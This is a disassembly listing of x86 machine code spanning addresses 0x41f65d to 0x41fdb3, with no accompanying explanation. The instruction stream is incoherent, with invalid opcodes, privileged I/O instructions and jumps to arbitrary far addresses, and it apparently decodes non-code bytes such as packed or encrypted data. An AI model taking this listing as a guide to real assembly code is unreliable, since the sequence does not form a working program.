  41f65d:	mov    ecx,0x3adcbd7d
  41f662:	icebp  
  41f663:	jmp    0x41f6d2
  41f665:	sbb    BYTE PTR [edx+0x5638511f],ch
  41f66b:	add    esi,ecx
  41f66d:	in     al,dx
  41f66e:	outs   dx,DWORD PTR ds:[esi]
  41f66f:	std    
  41f670:	in     al,0x66
  41f672:	adc    DWORD PTR [edx+0x4f],eax
  41f675:	retf   
  41f676:	mov    dl,0x5a
  41f678:	dec    ecx
  41f679:	pop    ebx
  41f67a:	xor    DWORD PTR [ebx+0x47],edi
  41f67d:	dec    edi
  41f67e:	test   ch,bh
  41f680:	add    al,bl
  41f682:	and    al,0x1b
  41f684:	or     cl,bh
  41f686:	cmp    dh,BYTE PTR [ecx]
  41f688:	shl    BYTE PTR [ecx-0x6129f921],0x10
  41f68f:	and    eax,0xab392e3e
  41f694:	mov    ch,0x8f
  41f696:	xchg   DWORD PTR [edi-0x3f963838],edi
  41f69c:	(bad)  
  41f69d:	add    al,0x8a
  41f69f:	jge    0x41f62b
  41f6a1:	clc    
  41f6a2:	pop    edx
  41f6a3:	(bad)  
  41f6a5:	pop    esp
  41f6a6:	repz cli 
  41f6a8:	add    ch,bh
  41f6aa:	xchg   ebp,eax
  41f6ab:	rol    esp,1
  41f6ad:	fs or  al,0xa7
  41f6b0:	adc    BYTE PTR [ebp+0x4c],0xba
  41f6b4:	xor    BYTE PTR [edx+0x5],dh
  41f6b7:	out    dx,eax
  41f6b8:	jmp    0xbad8ee8b
  41f6bd:	xor    eax,0xa729648c
  41f6c2:	aad    0xc3
  41f6c4:	xchg   ecx,eax
  41f6c5:	xor    esi,ecx
  41f6c7:	and    al,0xc6
  41f6c9:	mov    edi,0xd9151c49
  41f6ce:	enter  0xdf76,0x54
  41f6d2:	dec    ebx
  41f6d3:	sub    eax,0x2d988f62
  41f6d8:	cmp    cl,0xb3
  41f6db:	jo     0x41f721
  41f6dd:	xchg   ebx,eax
  41f6de:	std    
  41f6df:	xchg   DWORD PTR [edx+0x61c2fa5e],edi
  41f6e5:	mov    bl,0xbc
  41f6e7:	cmp    DWORD PTR [edi+ebx*4],0xffffffd8
  41f6eb:	bound  eax,QWORD PTR [edx+0x39]
  41f6ee:	mov    cs,edx
  41f6f0:	int3   
  41f6f1:	pop    es
  41f6f2:	sbb    al,0xa3
  41f6f4:	retf   0xb874
  41f6f7:	jne    0x41f6ac
  41f6f9:	fs hlt 
  41f6fb:	outs   dx,DWORD PTR ds:[esi]
  41f6fc:	rcl    BYTE PTR [ebp+0x3c63a9a2],1
  41f702:	pop    ss
  41f703:	and    al,0x7b
  41f706:	lea    edi,[edx]
  41f708:	xchg   esi,eax
  41f709:	scas   eax,DWORD PTR es:[edi]
  41f70a:	push   esi
  41f70b:	adc    BYTE PTR [eax+ecx*1],dl
  41f70e:	push   edx
  41f70f:	dec    edx
  41f710:	popf   
  41f711:	jge    0x41f6e1
  41f713:	xlat   BYTE PTR ds:[ebx]
  41f714:	fimul  DWORD PTR [edi+esi*2]
  41f717:	xchg   esi,eax
  41f718:	call   0x60e5eb45
  41f71d:	mov    eax,0x3fabdce5
  41f722:	lods   eax,DWORD PTR ds:[esi]
  41f723:	cmc    
  41f724:	rol    edi,cl
  41f726:	cwde   
  41f727:	xor    DWORD PTR [edi],0x44
  41f72a:	das    
  41f72b:	popf   
  41f72c:	(bad)  
  41f72d:	fsub   QWORD PTR [edi+esi*8]
  41f730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f731:	lea    eax,[ecx+0x386f5e1f]
  41f737:	push   es
  41f738:	and    BYTE PTR [edi+0x59],dl
  41f73b:	xchg   DWORD PTR [edx],ecx
  41f73d:	pop    ebp
  41f73e:	repz fidivr DWORD PTR [edx-0x5a]
  41f742:	jmp    0x668d:0xddd43188
  41f749:	int    0xc3
  41f74b:	jge    0x41f797
  41f74d:	xchg   edi,eax
  41f74e:	fidivr WORD PTR [ebp+0x626f5eed]
  41f754:	jne    0x41f6f2
  41f756:	adc    al,0x21
  41f758:	mov    esi,0x4c4e3dd
  41f75d:	aad    0xc4
  41f75f:	fcmovbe st,st(2)
  41f761:	ins    DWORD PTR es:[edi],dx
  41f762:	pop    esp
  41f763:	mov    eax,ebx
  41f765:	mov    ds:0xc43d7b4d,al
  41f76a:	sahf   
  41f76b:	mov    ah,0x25
  41f76d:	jge    0x41f721
  41f76f:	pop    edi
  41f770:	inc    edi
  41f771:	push   ecx
  41f772:	jns    0x41f775
  41f774:	mov    bh,0x6a
  41f776:	aas    
  41f777:	es jae 0x41f743
  41f77a:	ret    
  41f77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f77c:	cmp    BYTE PTR [ecx],ah
  41f77e:	pusha  
  41f77f:	xchg   eax,eax
  41f781:	out    0xc3,al
  41f783:	jp     0x41f7cf
  41f785:	stc    
  41f786:	dec    bh
  41f788:	pusha  
  41f789:	dec    BYTE PTR [ebp-0x5f]
  41f78c:	int    0x27
  41f78e:	(bad)  
  41f78f:	gs pusha 
  41f791:	popf   
  41f792:	in     al,0xbf
  41f794:	xor    cl,BYTE PTR [ebp-0x63]
  41f797:	xchg   ebx,eax
  41f798:	mov    WORD PTR [eax],ds
  41f79a:	mov    edi,DWORD PTR [ebx+0x41018fde]
  41f7a0:	scas   eax,DWORD PTR es:[edi]
  41f7a1:	mov    eax,0xfaff40c2
  41f7a6:	pop    esi
  41f7a7:	clts   
  41f7a9:	or     ebx,DWORD PTR [edx+0x46dfe582]
  41f7af:	push   eax
  41f7b0:	(bad)  
  41f7b1:	dec    eax
  41f7b2:	pusha  
  41f7b3:	inc    eax
  41f7b4:	scas   al,BYTE PTR es:[edi]
  41f7b5:	and    cl,BYTE PTR [eax-0x60362cbd]
  41f7bb:	push   0xffffff9a
  41f7bd:	cmc    
  41f7be:	mov    al,gs:0x617f95c3
  41f7c4:	lock aaa 
  41f7c6:	mov    cs,WORD PTR [esi]
  41f7c8:	xlat   BYTE PTR ds:[ebx]
  41f7c9:	lahf   
  41f7ca:	rcr    bl,cl
  41f7cc:	enter  0x160,0x4b
  41f7d0:	xor    DWORD PTR [ebp-0x21],ebx
  41f7d3:	mov    BYTE PTR [ecx-0x75b8cccc],bl
  41f7d9:	scas   eax,DWORD PTR es:[edi]
  41f7da:	retf   0xd43e
  41f7dd:	ret    
  41f7de:	and    eax,0x720333d9
  41f7e3:	leave  
  41f7e4:	and    eax,0x70ec9f68
  41f7e9:	aaa    
  41f7ea:	dec    esp
  41f7eb:	sbb    edx,DWORD PTR [esi-0x2806e789]
  41f7f1:	cmp    esi,DWORD PTR [eax-0x71]
  41f7f4:	leave  
  41f7f5:	rol    edx,cl
  41f7f7:	dec    ebx
  41f7f8:	shr    DWORD PTR [edi+0x56a201fa],cl
  41f7fe:	push   edx
  41f7ff:	adc    eax,0xf52c6eac
  41f804:	mov    eax,ds:0x7c30c47b
  41f809:	pop    ebp
  41f80a:	mov    ds,WORD PTR [ebx]
  41f80c:	adc    eax,edi
  41f80e:	cmp    al,0x39
  41f810:	or     edi,DWORD PTR [esi+0x442fc567]
  41f816:	int3   
  41f817:	jp     0x41f848
  41f819:	pop    ecx
  41f81a:	call   0x7e99:0xd7583d1
  41f821:	xlat   BYTE PTR ds:[ebx]
  41f822:	xchg   esi,eax
  41f823:	and    al,0xc2
  41f825:	(bad)  
  41f826:	mov    al,ds:0xc1c9aeb3
  41f82b:	enter  0x2872,0x6f
  41f82f:	adc    esp,0xac57f5de
  41f835:	shr    BYTE PTR [eax],1
  41f837:	jno    0x41f881
  41f839:	scas   eax,DWORD PTR es:[edi]
  41f83a:	xor    cl,BYTE PTR [ebp-0x46]
  41f83d:	add    bl,BYTE PTR [ebp+eax*4-0x3b069b09]
  41f844:	xchg   DWORD PTR [eax-0x24],esi
  41f847:	xchg   DWORD PTR [edx],esi
  41f849:	and    eax,0x183d0cc7
  41f84e:	sbb    al,0xf0
  41f850:	pop    ss
  41f851:	add    al,0x42
  41f853:	add    BYTE PTR [ecx],al
  41f855:	aaa    
  41f856:	stc    
  41f857:	fisubr DWORD PTR ds:0x99fd0d05
  41f85d:	mov    ds:0x6dd58713,al
  41f862:	je     0x41f83e
  41f864:	retf   
  41f865:	dec    eax
  41f866:	mov    cl,0xef
  41f868:	div    DWORD PTR [edi]
  41f86a:	std    
  41f86b:	push   cs
  41f86c:	mov    esp,0xfdb3abd0
  41f871:	aaa    
  41f872:	mov    eax,ds:0xada8ace
  41f877:	repz xchg esi,eax
  41f879:	add    eax,DWORD PTR [ecx]
  41f87b:	(bad)  
  41f87c:	pop    ebp
  41f87d:	push   edi
  41f87e:	popf   
  41f87f:	outs   dx,BYTE PTR ds:[esi]
  41f880:	test   eax,0x8a9117da
  41f885:	ja     0x41f82b
  41f887:	imul   esi,DWORD PTR [ebx],0xb1b27be6
  41f88d:	mov    ah,0xd9
  41f88f:	push   0x9c44ea2e
  41f894:	dec    ebp
  41f895:	scas   eax,DWORD PTR es:[edi]
  41f896:	dec    esi
  41f897:	jo     0x41f888
  41f899:	add    DWORD PTR [edi+0x5680f838],esp
  41f89f:	xor    BYTE PTR [ebx-0x6f19f10a],dh
  41f8a5:	mov    bl,0x17
  41f8a7:	pusha  
  41f8a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8a9:	clc    
  41f8aa:	bound  edi,QWORD PTR [ebx-0x20e1e406]
  41f8b0:	push   cs
  41f8b1:	dec    eax
  41f8b2:	stos   BYTE PTR es:[edi],al
  41f8b3:	sbb    dl,BYTE PTR [eax]
  41f8b5:	mov    al,0x6c
  41f8b7:	push   ebp
  41f8b8:	(bad)  [ecx+0x586fa253]
  41f8be:	adc    BYTE PTR [edi-0x2e],0xcd
  41f8c2:	xor    dh,dh
  41f8c4:	ret    
  41f8c5:	xor    DWORD PTR [eax-0x7ce3f7b6],0x421a6502
  41f8cf:	cdq    
  41f8d0:	sahf   
  41f8d1:	jge    0x41f8e4
  41f8d3:	aaa    
  41f8d4:	(bad)  
  41f8d5:	fbld   TBYTE PTR [esi+0x151b6bd9]
  41f8db:	jno    0x41f8f4
  41f8dd:	cwde   
  41f8de:	mov    ?,WORD PTR [bp+si]
  41f8e1:	pop    ds
  41f8e2:	inc    esp
  41f8e3:	addr16 push ds
  41f8e5:	repz (bad) 
  41f8e7:	xor    ebx,DWORD PTR [esi]
  41f8e9:	sti    
  41f8ea:	pop    ds
  41f8eb:	xor    BYTE PTR [edi],cl
  41f8ed:	push   0xc8d06969
  41f8f2:	cld    
  41f8f3:	jno    0x41f898
  41f8f5:	retf   0x2f8d
  41f8f8:	mov    esi,0x57c41f5c
  41f8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8fe:	cmp    cl,BYTE PTR [edx]
  41f900:	loop   0x41f8e0
  41f902:	inc    edi
  41f903:	imul   ebx,DWORD PTR [edx],0x7c038122
  41f909:	pop    ebp
  41f90a:	sub    al,cl
  41f90c:	mov    ecx,0xdf8ea15e
  41f911:	out    dx,al
  41f912:	adc    BYTE PTR [ecx-0x44],ah
  41f915:	loopne 0x41f8cb
  41f917:	add    BYTE PTR [edi],ah
  41f919:	pop    ebp
  41f91a:	ds push esp
  41f91c:	repz js 0x41f907
  41f91f:	pop    ebp
  41f920:	icebp  
  41f921:	fistp  WORD PTR [eax-0x679d2e8]
  41f927:	mov    ebp,0xbb4deee
  41f92c:	push   eax
  41f92d:	add    eax,0xad474da2
  41f932:	int3   
  41f933:	lea    ebp,[edx+0x2260483a]
  41f939:	xchg   edi,eax
  41f93a:	lahf   
  41f93b:	mov    ds:0x216ecfed,al
  41f940:	inc    ecx
  41f941:	dec    esp
  41f942:	in     eax,0x16
  41f944:	push   edx
  41f945:	mov    esp,0xf723f884
  41f94a:	inc    edi
  41f94b:	(bad)  
  41f94c:	in     al,0xe4
  41f94e:	jp     0x41f986
  41f950:	fld    TBYTE PTR [esp+ecx*8+0x316d5720]
  41f957:	imul   ecx,DWORD PTR [edi],0xd7096f75
  41f95d:	and    ah,ah
  41f95f:	add    esp,DWORD PTR [edx-0x13f8a2a5]
  41f965:	sub    eax,0xfed1cf8a
  41f96a:	xor    ecx,DWORD PTR [edi+0x5aaf36da]
  41f970:	outs   dx,BYTE PTR ds:[esi]
  41f971:	push   edx
  41f972:	mov    ch,0x57
  41f974:	sub    eax,0x47c3f4c2
  41f979:	call   0x5b2e:0x840a15e3
  41f980:	jno    0x41f94b
  41f982:	mov    eax,ds:0xf58b0f63
  41f987:	mov    eax,0xd0716b64
  41f98c:	jo     0x41f94b
  41f98e:	adc    DWORD PTR [ebx+0x57dcd54d],eax
  41f994:	push   cs
  41f995:	ins    DWORD PTR es:[edi],dx
  41f996:	outs   dx,DWORD PTR ds:[esi]
  41f997:	xor    DWORD PTR [esi+0x329afb7c],ebp
  41f99d:	push   cs
  41f99e:	xor    al,0xe0
  41f9a0:	adc    eax,0x41481290
  41f9a5:	mov    al,0x27
  41f9a7:	sub    eax,0x53a1bd0f
  41f9ac:	ret    
  41f9ad:	push   cs
  41f9ae:	lods   al,BYTE PTR ds:[esi]
  41f9af:	or     BYTE PTR ds:0x5c613f63,cl
  41f9b5:	popa   
  41f9b6:	js     0x41f977
  41f9b8:	in     al,0x11
  41f9ba:	call   0x6fd8147f
  41f9bf:	sbb    al,0xd0
  41f9c1:	daa    
  41f9c2:	ds aam 0x15
  41f9c5:	int    0xc0
  41f9c7:	inc    ebx
  41f9c8:	pop    ebx
  41f9c9:	and    BYTE PTR [ecx+0x5c],ch
  41f9cc:	in     al,dx
  41f9cd:	int3   
  41f9ce:	push   ecx
  41f9cf:	and    al,0xc6
  41f9d1:	popf   
  41f9d2:	lock jbe 0x41f963
  41f9d5:	shr    BYTE PTR [edx-0x2e],0xd0
  41f9d9:	test   eax,0x69fda57f
  41f9de:	mov    edx,0x1171cc6b
  41f9e3:	sbb    eax,0xa63d59a
  41f9e8:	les    ecx,FWORD PTR [ebx]
  41f9ea:	xchg   edi,eax
  41f9eb:	shl    DWORD PTR [ecx+0x24bec6e4],1
  41f9f1:	push   ebp
  41f9f2:	cmp    al,bl
  41f9f4:	loop   0x41fa11
  41f9f6:	mov    esi,0x2fd54d69
  41f9fb:	adc    al,0x71
  41f9fd:	lea    ebx,[ebx+eiz*2+0x53070de6]
  41fa04:	or     al,BYTE PTR [eax-0x7]
  41fa07:	push   0xc22c8ae2
  41fa0c:	mov    ds:0xc52f39e9,al
  41fa11:	lahf   
  41fa12:	dec    ecx
  41fa13:	repz stc 
  41fa15:	push   ds
  41fa16:	push   esp
  41fa17:	(bad)  
  41fa18:	mov    ebp,0xa424b069
  41fa1d:	int3   
  41fa1e:	or     bh,0x66
  41fa21:	xchg   edx,eax
  41fa22:	mov    BYTE PTR [ebx+0x3fbd4a48],ch
  41fa28:	cli    
  41fa29:	jno    0x41f9ae
  41fa2b:	lods   al,BYTE PTR ds:[esi]
  41fa2c:	lock or BYTE PTR ds:0xc245aaf9,bh
  41fa33:	sub    BYTE PTR [esi-0x6a],ch
  41fa36:	cmp    al,0x5d
  41fa38:	add    dl,BYTE PTR [ebx+0x66cc3893]
  41fa3e:	sub    BYTE PTR [edi+ebp*8+0x9],bl
  41fa42:	sub    al,0x7f
  41fa44:	push   es
  41fa45:	pop    ecx
  41fa46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa47:	mov    DWORD PTR [edi+0x3e0fd2e3],ebx
  41fa4d:	shl    dx,0x98
  41fa51:	stos   DWORD PTR es:[edi],eax
  41fa52:	pop    ebx
  41fa53:	(bad)  
  41fa54:	jl     0x41fa14
  41fa56:	dec    esp
  41fa57:	scas   al,BYTE PTR es:[edi]
  41fa58:	fnstenv [ecx+ecx*2+0x70]
  41fa5c:	adc    eax,0xe4089e88
  41fa61:	sbb    eax,0x1f098402
  41fa66:	hlt    
  41fa67:	cmp    DWORD PTR [eax],ebx
  41fa69:	or     al,0xd4
  41fa6b:	fwait
  41fa6c:	in     al,0xb0
  41fa6e:	mov    cl,0x16
  41fa70:	dec    eax
  41fa71:	pop    edx
  41fa72:	lock or ebp,DWORD PTR [edi+edi*8-0x5d]
  41fa77:	jbe    0x41fa22
  41fa79:	mov    al,0x25
  41fa7b:	mov    ds:0x7f40297d,al
  41fa80:	call   edi
  41fa82:	inc    edx
  41fa83:	mov    ecx,0x20f0ebfd
  41fa88:	lods   al,BYTE PTR ds:[esi]
  41fa89:	xor    edi,esi
  41fa8b:	retf   
  41fa8c:	sbb    esi,DWORD PTR [esi]
  41fa8e:	adc    DWORD PTR [edx],0xffffff8e
  41fa91:	xlat   BYTE PTR ds:[ebx]
  41fa92:	or     al,0xa1
  41fa94:	lds    esp,FWORD PTR [ecx]
  41fa96:	sbb    ecx,DWORD PTR [ebx+0x6e]
  41fa99:	int3   
  41fa9a:	jns    0x41fb08
  41fa9c:	push   edi
  41fa9d:	ret    
  41fa9e:	jns    0x41facb
  41faa0:	pop    ebx
  41faa1:	mov    ds:0x168d3578,eax
  41faa6:	int    0x66
  41faa8:	int    0xc0
  41faaa:	pop    ebx
  41faab:	push   es
  41faac:	push   edx
  41faad:	or     bl,BYTE PTR [edi-0x24]
  41fab0:	xchg   ecx,eax
  41fab1:	mov    dh,0x9
  41fab3:	mov    ds:0xbc5d5424,al
  41fab8:	xor    esp,ebx
  41faba:	pop    esi
  41fabb:	mov    ds:0xdc2b7155,eax
  41fac0:	retf   
  41fac1:	js     0x41fa44
  41fac3:	cli    
  41fac4:	loop   0x41fac3
  41fac6:	add    al,0x39
  41fac8:	push   esi
  41fac9:	jbe    0x41fa92
  41facb:	aad    0xc
  41facd:	sub    dl,bh
  41facf:	dec    esp
  41fad0:	or     al,0x42
  41fad2:	mov    esp,0x5aacface
  41fad7:	pop    ss
  41fad8:	iret   
  41fad9:	repz push eax
  41fadb:	pop    eax
  41fadc:	cmc    
  41fadd:	or     dl,BYTE PTR [edi+0x27]
  41fae0:	dec    ebx
  41fae1:	(bad)  
  41fae2:	clc    
  41fae3:	dec    edx
  41fae4:	pop    edx
  41fae5:	(bad)  
  41fae6:	into   
  41fae7:	inc    edi
  41fae8:	push   ss
  41fae9:	adc    ebp,DWORD PTR [edi+0x5ea4ae30]
  41faef:	and    esp,DWORD PTR [ebx+ebp*4]
  41faf2:	and    eax,0x409287d
  41faf7:	mov    BYTE PTR [edx+ecx*2+0x64],ch
  41fafb:	sbb    eax,0x50129e73
  41fb00:	mov    bl,0x6c
  41fb02:	repnz xor dl,BYTE PTR [ecx+0x643b6e74]
  41fb09:	xchg   dh,dh
  41fb0b:	aas    
  41fb0c:	clc    
  41fb0d:	xor    ebx,DWORD PTR [edx+0x3b]
  41fb10:	push   esi
  41fb11:	pop    esi
  41fb12:	xchg   ebx,eax
  41fb13:	mov    eax,0xe0948874
  41fb18:	inc    edi
  41fb19:	pop    ecx
  41fb1a:	sub    edi,edx
  41fb1c:	es in  al,0x8c
  41fb1f:	sbb    dl,BYTE PTR [ecx-0x47389e16]
  41fb25:	(bad)  
  41fb26:	aas    
  41fb27:	clc    
  41fb28:	test   eax,0x1bac57a9
  41fb2d:	push   eax
  41fb2e:	in     eax,0x4e
  41fb30:	shr    BYTE PTR [ebx-0x1],0x8b
  41fb34:	cs mov gs,ebp
  41fb37:	xor    dh,dl
  41fb39:	pusha  
  41fb3a:	inc    ebx
  41fb3b:	loop   0x41fb32
  41fb3d:	(bad)  
  41fb3e:	pop    ecx
  41fb3f:	xlat   BYTE PTR ds:[ebx]
  41fb40:	adc    al,0x67
  41fb42:	(bad)  
  41fb44:	or     eax,0x1f5676ea
  41fb49:	xchg   ebp,eax
  41fb4a:	cld    
  41fb4b:	xchg   ecx,eax
  41fb4c:	jmp    0x41fb0f
  41fb4e:	push   esp
  41fb4f:	push   ebx
  41fb50:	shr    DWORD PTR [ecx],1
  41fb52:	xor    al,0x2c
  41fb54:	shl    BYTE PTR [ecx+esi*1-0xd64ad1d],1
  41fb5b:	or     al,0x72
  41fb5d:	adc    BYTE PTR [edi],cl
  41fb5f:	jno    0x41faf5
  41fb61:	pop    eax
  41fb62:	jmp    0x41fb06
  41fb64:	clc    
  41fb65:	sub    eax,0xd5103ff4
  41fb6a:	fist   WORD PTR [edx-0x56]
  41fb6d:	push   edi
  41fb6e:	shr    BYTE PTR [ebx],0x47
  41fb71:	sbb    BYTE PTR [edi],0x4e
  41fb74:	push   esp
  41fb75:	cdq    
  41fb76:	inc    ecx
  41fb77:	mov    dh,0x1b
  41fb79:	test   BYTE PTR [ebx+0x58],0x28
  41fb7d:	outs   dx,BYTE PTR ds:[esi]
  41fb7e:	add    BYTE PTR [esi],dh
  41fb80:	shl    dl,cl
  41fb82:	icebp  
  41fb83:	gs out dx,al
  41fb85:	std    
  41fb86:	push   0xd60fed0c
  41fb8b:	sbb    ecx,0x6f
  41fb8e:	add    cl,BYTE PTR [eax+0x20c6c335]
  41fb94:	arpl   WORD PTR [edi+eiz*8-0x4657eb40],ax
  41fb9b:	mov    es,WORD PTR [ebx-0x75]
  41fb9e:	sub    BYTE PTR [ebx],ah
  41fba0:	lods   al,BYTE PTR ds:[esi]
  41fba1:	adc    BYTE PTR [ecx-0x2e],al
  41fba4:	xchg   ebp,eax
  41fba5:	push   esp
  41fba6:	out    0x35,al
  41fba8:	scas   al,BYTE PTR es:[edi]
  41fba9:	in     eax,dx
  41fbaa:	loope  0x41fc18
  41fbac:	js     0x41fb87
  41fbae:	ins    BYTE PTR es:[edi],dx
  41fbaf:	aas    
  41fbb0:	mov    ds:0x917619c0,al
  41fbb5:	jno    0x41fba5
  41fbb7:	mov    ecx,0xbf8c8554
  41fbbc:	nop
  41fbbd:	repnz push 0xe45fad12
  41fbc3:	dec    ebp
  41fbc4:	fmul   DWORD PTR ds:0x851d278
  41fbca:	push   0x2db0a9d2
  41fbcf:	xchg   esi,eax
  41fbd0:	pop    ebx
  41fbd1:	jns    0x41fc01
  41fbd3:	into   
  41fbd4:	retf   
  41fbd5:	mov    eax,0xc0088718
  41fbda:	xchg   esi,eax
  41fbdb:	adc    DWORD PTR [edx-0x598bb56a],eax
  41fbe1:	aad    0x9e
  41fbe3:	push   es
  41fbe4:	out    0xc2,al
  41fbe6:	dec    eax
  41fbe7:	ret    
  41fbe8:	shl    edi,cl
  41fbea:	jb     0x41fb7a
  41fbec:	cmp    al,0xf
  41fbee:	mov    eax,0x605c2dbe
  41fbf3:	sub    bh,BYTE PTR [edi-0x2b]
  41fbf6:	xchg   DWORD PTR [ebx+0x5cc91d9],ebx
  41fbfc:	and    BYTE PTR [esi+edx*8-0x353cf18d],al
  41fc03:	cmp    al,0xa6
  41fc05:	iret   
  41fc06:	out    dx,eax
  41fc07:	ret    0x1936
  41fc0a:	arpl   WORD PTR [ebx+0x40],si
  41fc0d:	repnz pop ds
  41fc0f:	jmp    0x2ea1:0xd7f47d63
  41fc16:	stc    
  41fc17:	sbb    esi,DWORD PTR [edx]
  41fc19:	dec    ebx
  41fc1a:	mov    ds:0x6785e309,eax
  41fc1f:	push   esp
  41fc20:	xor    ebp,DWORD PTR [esi-0x13]
  41fc23:	mov    ebp,edi
  41fc25:	add    DWORD PTR [eax-0x266f1de5],ebp
  41fc2b:	jle    0x41fbc8
  41fc2d:	js     0x41fbd6
  41fc2f:	jo     0x41fbd7
  41fc31:	jg     0x41fc97
  41fc33:	jns    0x41fc26
  41fc35:	mov    ds:0x90b1ea9e,al
  41fc3a:	xchg   edx,eax
  41fc3b:	mov    edx,0x520488ad
  41fc40:	sbb    ebp,esp
  41fc42:	dec    esp
  41fc43:	lods   al,BYTE PTR ds:[esi]
  41fc44:	rcl    DWORD PTR [edi-0x1e],cl
  41fc47:	jmp    0x41fc1e
  41fc49:	mov    edx,0xd46bcae
  41fc4e:	retf   
  41fc4f:	cwde   
  41fc50:	gs and al,0x5c
  41fc53:	div    BYTE PTR [eax-0x63]
  41fc56:	mov    esi,DWORD PTR [ecx]
  41fc58:	pop    ss
  41fc59:	inc    esi
  41fc5a:	pop    ecx
  41fc5b:	adc    DWORD PTR [eax-0x31838693],ebx
  41fc61:	jbe    0x41fbf4
  41fc63:	xchg   edx,eax
  41fc64:	or     eax,0xa2e5de5b
  41fc69:	ret    0x660e
  41fc6c:	popa   
  41fc6d:	mov    ebx,0x24e4b53d
  41fc72:	js     0x41fc94
  41fc74:	fnsave [esi+0x78]
  41fc77:	std    
  41fc78:	cwde   
  41fc79:	mov    BYTE PTR [ecx+0x4dad9d04],dl
  41fc7f:	in     eax,0xac
  41fc81:	sub    bl,BYTE PTR [ebp+eax*2-0x12101dd2]
  41fc88:	in     eax,dx
  41fc89:	call   0xbcaab104
  41fc8e:	cmp    eax,0x9cd8d518
  41fc93:	mov    es,eax
  41fc95:	jmp    0xaad2:0x278e0f2c
  41fc9c:	add    bl,BYTE PTR [esi+0x20e6cbdd]
  41fca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fca3:	call   0x9035:0x5b7ac9b0
  41fcaa:	fwait
  41fcab:	xor    DWORD PTR [ebx+0x6062f9a9],ebp
  41fcb1:	fimul  WORD PTR [eax+0x31]
  41fcb4:	add    ebx,DWORD PTR [esi]
  41fcb6:	inc    esp
  41fcb7:	frstor [eax+0x34]
  41fcba:	sbb    DWORD PTR [eax-0x78],edi
  41fcbd:	popa   
  41fcbe:	jge    0x41fc4a
  41fcc0:	gs aam 0x3c
  41fcc3:	adc    al,0xd0
  41fcc5:	xchg   esp,eax
  41fcc6:	test   eax,0xd42b93b9
  41fccb:	xchg   DWORD PTR [ecx-0x2902e474],esp
  41fcd1:	inc    eax
  41fcd2:	in     al,0xc8
  41fcd4:	dec    esp
  41fcd5:	and    al,0xf1
  41fcd7:	sahf   
  41fcd8:	jge    0x41fc78
  41fcda:	xchg   esi,eax
  41fcdb:	xor    DWORD PTR [ecx-0x7ba62af7],ebp
  41fce1:	pop    ebx
  41fce2:	xor    ebx,eax
  41fce4:	test   ecx,eax
  41fce6:	xor    ah,BYTE PTR [ebx+eax*4]
  41fce9:	pop    ebx
  41fcea:	pop    ds
  41fceb:	daa    
  41fcec:	cli    
  41fced:	mov    esp,0x18b3d4e6
  41fcf2:	pop    edi
  41fcf3:	xchg   BYTE PTR [ebx-0x53783399],ch
  41fcf9:	xor    edx,0x77da84da
  41fcff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd00:	sbb    BYTE PTR [ebx-0x71],ch
  41fd03:	in     eax,0xce
  41fd05:	(bad)  
  41fd06:	ja     0x41fd76
  41fd08:	std    
  41fd09:	pop    edx
  41fd0a:	sub    al,0xcb
  41fd0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd0d:	aaa    
  41fd0e:	jns    0x41fd08
  41fd10:	cld    
  41fd11:	sbb    al,BYTE PTR [ebx+0x3b]
  41fd14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd15:	fsubr  DWORD PTR [esi]
  41fd17:	aad    0xac
  41fd19:	jp     0x41fd4e
  41fd1b:	pop    ds
  41fd1c:	jmp    0x41fd50
  41fd1e:	or     al,0xf3
  41fd20:	fwait
  41fd21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd22:	mov    edi,0x60b5f627
  41fd27:	scas   al,BYTE PTR es:[edi]
  41fd28:	pusha  
  41fd29:	cmp    al,0x7f
  41fd2b:	pushf  
  41fd2c:	lock xchg DWORD PTR [esi],edi
  41fd2f:	jmp    0x41fcca
  41fd31:	sub    BYTE PTR [edi],0xe0
  41fd34:	sar    cl,cl
  41fd36:	pop    esp
  41fd37:	adc    cl,BYTE PTR [esi+eiz*4-0x145993c1]
  41fd3e:	jae    0x41fcfb
  41fd40:	jmp    0x6c17:0xf21485a6
  41fd47:	mov    dh,BYTE PTR [eax]
  41fd49:	push   ds
  41fd4a:	cld    
  41fd4b:	fnstsw WORD PTR [ecx]
  41fd4d:	jo     0x41fd5a
  41fd4f:	addr16 out dx,al
  41fd51:	pop    ecx
  41fd52:	pop    ebp
  41fd53:	mov    dl,0x1a
  41fd55:	xchg   ebx,eax
  41fd56:	adc    bl,cl
  41fd58:	pop    ebx
  41fd59:	popf   
  41fd5a:	iret   
  41fd5b:	mov    bh,0x2f
  41fd5d:	std    
  41fd5e:	rol    BYTE PTR [edi],1
  41fd60:	repnz hlt 
  41fd62:	rcr    BYTE PTR [edx-0x10],0x26
  41fd66:	repnz sar DWORD PTR [edi-0x5b],0x37
  41fd6b:	xchg   ebx,eax
  41fd6c:	outs   dx,BYTE PTR ds:[esi]
  41fd6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd6e:	mov    esp,0x58e97dbb
  41fd73:	loopne 0x41fd42
  41fd75:	dec    ebx
  41fd76:	sbb    eax,0x8ebe7630
  41fd7b:	jmp    0x2de2:0x8d8b9df
  41fd82:	sti    
  41fd83:	inc    esi
  41fd84:	push   eax
  41fd85:	adc    DWORD PTR [esi],0xffffffe7
  41fd88:	sbb    al,0x54
  41fd8a:	xor    al,0x1
  41fd8c:	ret    
  41fd8d:	nop
  41fd8e:	sbb    DWORD PTR [esi+0x1d],ecx
  41fd91:	inc    esi
  41fd92:	popa   
  41fd93:	imul   ebx,DWORD PTR [edi+0x36],0x7a7714d2
  41fd9a:	mov    eax,ds:0x82743e23
  41fd9f:	fmul   QWORD PTR [ebx+0x7a]
  41fda2:	fdecstp 
  41fda4:	cmp    edi,esp
  41fda6:	dec    ecx
  41fda7:	jo     0x41fe09
  41fda9:	mov    al,0x15
  41fdab:	repz mov ss,WORD PTR [edx-0x57]
  41fdaf:	push   ebp
  41fdb0:	push   esi
  41fdb1:	pop    ds
  41fdb2:	push   ebx
  41fdb3:	leave  
